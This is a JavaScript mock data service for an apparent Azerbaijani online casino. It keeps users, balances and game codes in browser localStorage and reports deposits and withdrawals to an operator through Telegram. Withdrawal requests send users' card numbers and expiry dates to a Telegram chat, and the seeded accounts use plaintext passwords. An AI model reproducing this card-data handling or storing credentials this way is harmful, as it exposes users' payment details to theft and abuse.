import { TelegramService } from "./TelegramService";

const MOCK_USERS_KEY = "casino_mock_users";
const MOCK_TRANSACTIONS_KEY = "casino_mock_transactions";
const MOCK_CODES_KEY = "casino_mock_codes";
const MOCK_ADMIN_SETTINGS_KEY = "casino_admin_settings";

const initialUsers = [
  { id: 1, username: "admin", phone: "0501112233", password: "admin", balance: 1000, role: "admin", status: "active", gameCode: null },
  { id: 2, username: "user1", phone: "0502223344", password: "123", balance: 500, role: "user", status: "active", gameCode: null },
];

const initialSettings = {
  adminCard: "4127 0000 1111 2222",
  adminCardName: "Tiflis Kazino Admin"
};

export const MockDataService = {
  getUsers: () => {
    const data = localStorage.getItem(MOCK_USERS_KEY);
    if (!data) {
      localStorage.setItem(MOCK_USERS_KEY, JSON.stringify(initialUsers));
      return initialUsers;
    }
    return JSON.parse(data);
  },

  getAdminSettings: () => {
    const data = localStorage.getItem(MOCK_ADMIN_SETTINGS_KEY);
    if (!data) {
      localStorage.setItem(MOCK_ADMIN_SETTINGS_KEY, JSON.stringify(initialSettings));
      return initialSettings;
    }
    return JSON.parse(data);
  },

  updateAdminSettings: (settings) => {
    localStorage.setItem(MOCK_ADMIN_SETTINGS_KEY, JSON.stringify(settings));
    return settings;
  },

  updateUserBalance: (userId, amount) => {
    const users = MockDataService.getUsers();
    const updated = users.map(u => u.id === userId ? { ...u, balance: (u.balance || 0) + amount } : u);
    localStorage.setItem(MOCK_USERS_KEY, JSON.stringify(updated));
    return updated;
  },

  assignCodeToUser: (userId, code) => {
    const users = MockDataService.getUsers();
    const codes = MockDataService.getGameCodes();
    
    // Mark new code as used, old code as unused if exists
    const user = users.find(u => u.id === userId);
    const updatedCodes = codes.map(c => {
      if (c.code === code) return { ...c, used: true };
      if (user && user.gameCode === c.code) return { ...c, used: false };
      return c;
    });
    localStorage.setItem(MOCK_CODES_KEY, JSON.stringify(updatedCodes));

    const updatedUsers = users.map(u => u.id === userId ? { ...u, gameCode: code } : u);
    localStorage.setItem(MOCK_USERS_KEY, JSON.stringify(updatedUsers));
    return updatedUsers;
  },

  autoAssignCode: (userId) => {
    const users = MockDataService.getUsers();
    const user = users.find(u => u.id === userId);
    if (user && user.gameCode) return user.gameCode;

    const codes = MockDataService.getGameCodes();
    const availableCode = codes.find(c => !c.used);
    
    if (availableCode) {
      MockDataService.assignCodeToUser(userId, availableCode.code);
      return availableCode.code;
    }
    return null;
  },

  getTransactions: () => {
    const data = localStorage.getItem(MOCK_TRANSACTIONS_KEY);
    return data ? JSON.parse(data) : [];
  },

  addTransaction: (tx) => {
    const txs = MockDataService.getTransactions();
    // Save only filename in storage to avoid serialization issues
    const storageTx = { ...tx, id: Date.now(), status: "pending", date: new Date().toISOString() };
    if (tx.receipt instanceof File) {
      storageTx.receipt = tx.receipt.name;
    }
    txs.push(storageTx);
    localStorage.setItem(MOCK_TRANSACTIONS_KEY, JSON.stringify(txs));

    // Instant game code assignment for first time depositors
    const users = MockDataService.getUsers();
    const user = users.find(u => u.username === tx.username);
    let userGameCode = user?.gameCode;

    if (tx.type === "deposit" && user && !userGameCode) {
      userGameCode = MockDataService.autoAssignCode(user.id);
    }

    // Telegram Notification
    const typeLabel = tx.type === "deposit" ? "DEPOZIT" : "ÇIXARIŞ";
    const emoji = tx.type === "deposit" ? "📥" : "📤";
    const details = tx.type === "deposit" 
      ? `\n<b>Çek:</b> ${storageTx.receipt || "Yoxdur"}`
      : `\n<b>Kart:</b> ${tx.cardNumber}\n<b>Tarix:</b> ${tx.expiryDate}`;

    const message = `${emoji} <b>YENİ ${typeLabel} SORĞUSU</b>\n\n` +
      `<b>İstifadəçi:</b> ${tx.username}\n` +
      `<b>Müştəri ID:</b> ${user?.id || "Yoxdur"}\n` +
      `<b>Oyun Kodu:</b> ${userGameCode || "Təyin edilməyib"}\n` +
      `<b>Məbləğ:</b> ${tx.amount} AZN` +
      details +
      `\n\n<b>Status:</b> Gözləyir`;

    const buttons = [
      [
        { text: "✅ Təsdiqlə", callback_data: `approve_${storageTx.id}` },
        { text: "❌ Ləğv et", callback_data: `reject_${storageTx.id}` }
      ]
    ];

    if (tx.type === "deposit" && tx.receipt instanceof File) {
      TelegramService.sendPhoto(message, tx.receipt, buttons);
    } else {
      TelegramService.sendMessage(message, buttons);
    }

    return storageTx;
  },

  updateTransactionStatus: (txId, status, reason = null) => {
    const txs = MockDataService.getTransactions();
    const updatedTxs = txs.map(t => {
      if (t.id === Number(txId)) {
        return { ...t, status, reason: reason };
      }
      return t;
    });
    localStorage.setItem(MOCK_TRANSACTIONS_KEY, JSON.stringify(updatedTxs));
    
    if (status === "approved") {
      const tx = txs.find(t => t.id === Number(txId));
      if (tx) {
        const users = MockDataService.getUsers();
        const user = users.find(u => u.username === tx.username);
        if (user) {
          const amount = tx.type === "deposit" ? tx.amount : -tx.amount;
          MockDataService.updateUserBalance(user.id, amount);
        }
      }
    }
    return updatedTxs;
  },

  getFinanceStats: () => {
    const txs = MockDataService.getTransactions();
    const approved = txs.filter(t => t.status === "approved");
    
    const totalDeposits = approved.filter(t => t.type === "deposit").reduce((sum, t) => sum + t.amount, 0);
    const totalWithdrawals = approved.filter(t => t.type === "withdraw").reduce((sum, t) => sum + t.amount, 0);
    
    return {
      totalDeposits,
      totalWithdrawals,
      netProfit: totalDeposits - totalWithdrawals,
      pendingCount: txs.filter(t => t.status === "pending").length,
      approvedCount: approved.length
    };
  },

  getGameCodes: () => {
    const data = localStorage.getItem(MOCK_CODES_KEY);
    return data ? JSON.parse(data) : [];
  },

  addGameCodes: (codes) => {
    const existing = MockDataService.getGameCodes();
    const newCodes = codes.map(code => ({ id: Math.random().toString(36).substr(2, 9), code, used: false }));
    const updated = [...existing, ...newCodes];
    localStorage.setItem(MOCK_CODES_KEY, JSON.stringify(updated));
    return updated;
  },

  clearCodes: () => {
    localStorage.removeItem(MOCK_CODES_KEY);
    return [];
  },

  clearTransactions: () => {
    localStorage.removeItem(MOCK_TRANSACTIONS_KEY);
    return [];
  }
};

